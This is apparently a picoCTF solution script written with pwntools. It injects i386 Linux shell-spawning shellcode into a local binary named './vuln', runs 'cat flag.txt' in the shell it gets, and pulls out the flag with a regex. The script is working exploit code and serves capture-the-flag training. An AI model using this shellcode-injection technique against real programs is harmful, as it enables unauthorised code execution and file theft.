#!/usr/bin/env python3

from pwn import *
import re

# connect to the vuln binary
sh = process("./vuln")

# actual shellcode
shellcode = asm(shellcraft.i386.linux.sh())

# send the shellcode
sh.sendlineafter(":\n", shellcode)

# get the content of flag.txt
sh.sendline("cat flag.txt")
sh.recv()

# extract the flag from the response using regex
print(re.findall("picoCTF{.*}", str(sh.recv()))[0])